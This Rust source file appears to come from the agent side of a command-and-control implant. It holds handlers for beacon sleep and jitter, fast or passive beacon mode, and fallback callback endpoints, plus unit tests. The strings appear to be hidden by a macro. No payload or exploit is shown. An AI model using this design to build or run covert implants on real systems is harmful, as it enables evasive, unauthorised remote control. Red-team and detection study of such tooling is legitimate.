// src/agent/handlers/config.rs — Sleep, beacon mode, fallback configuration

use crate::lc;
use super::{DispatchResult, AgentAction};

pub fn handle_sleep(args: &str) -> DispatchResult {
    let parts: Vec<&str> = args.split_whitespace().collect();
    if parts.len() < 3 {
        return DispatchResult::Reply(String::new(), lc!("Usage: sleep <seconds> <jitter_min> <jitter_max>"), 1, AgentAction::None);
    }
    match (parts[0].parse::<u64>(), parts[1].parse::<u32>(), parts[2].parse::<u32>()) {
        (Ok(s), Ok(min), Ok(max)) => {
            let msg = format!("{} {}s, {}-{}-{}%", lc!("Configuration Updated: Sleep"), s, lc!("Jitter"), min, max);
            DispatchResult::Reply(msg, String::new(), 0, AgentAction::UpdateConfig(s, min, max))
        }
        _ => DispatchResult::Reply(String::new(), lc!("Parse Error"), 1, AgentAction::None),
    }
}

pub fn handle_beacon_mode(active: bool) -> DispatchResult {
    if active {
        DispatchResult::Reply(lc!("Beacon Activated (Fast Mode)"), String::new(), 0, AgentAction::SetMode(true))
    } else {
        DispatchResult::Reply(lc!("Beacon Deactivated (Passive Mode)"), String::new(), 0, AgentAction::SetMode(false))
    }
}

pub fn handle_fallback_config() -> DispatchResult {
    let fb = &crate::agent::config::load().fallback;
    let info = if fb.endpoints.is_empty() {
        "No fallback endpoints configured (single host mode)".to_string()
    } else {
        let mut lines = vec![format!("Strategy: {:?}", fb.strategy)];
        lines.push(format!("Dead time: {}s", fb.dead_time_secs));
        for (i, ep) in fb.endpoints.iter().enumerate() {
            lines.push(format!("[{}] {}:{} {:?} prio={} weight={} max_fail={}",
                i, ep.host, ep.port, ep.transport, ep.priority, ep.weight, ep.max_failures));
        }
        lines.join("\n")
    };
    DispatchResult::Reply(info, String::new(), 0, AgentAction::None)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sleep_valid_args() {
        match handle_sleep("30 10 20") {
            DispatchResult::Reply(out, err, code, AgentAction::UpdateConfig(30, 10, 20)) => {
                assert_eq!(code, 0);
                assert!(err.is_empty());
                assert!(out.contains("30s"));
            }
            _ => panic!("Expected UpdateConfig"),
        }
    }

    #[test]
    fn sleep_missing_args() {
        match handle_sleep("30") {
            DispatchResult::Reply(_, err, code, AgentAction::None) => {
                assert_eq!(code, 1);
                assert!(err.contains("Usage"));
            }
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn sleep_bad_number() {
        match handle_sleep("abc 10 20") {
            DispatchResult::Reply(_, _, code, AgentAction::None) => assert_eq!(code, 1),
            _ => panic!("Expected parse error"),
        }
    }

    #[test]
    fn beacon_mode_active() {
        match handle_beacon_mode(true) {
            DispatchResult::Reply(_, _, 0, AgentAction::SetMode(true)) => {}
            _ => panic!("Expected SetMode(true)"),
        }
    }

    #[test]
    fn beacon_mode_passive() {
        match handle_beacon_mode(false) {
            DispatchResult::Reply(_, _, 0, AgentAction::SetMode(false)) => {}
            _ => panic!("Expected SetMode(false)"),
        }
    }
}
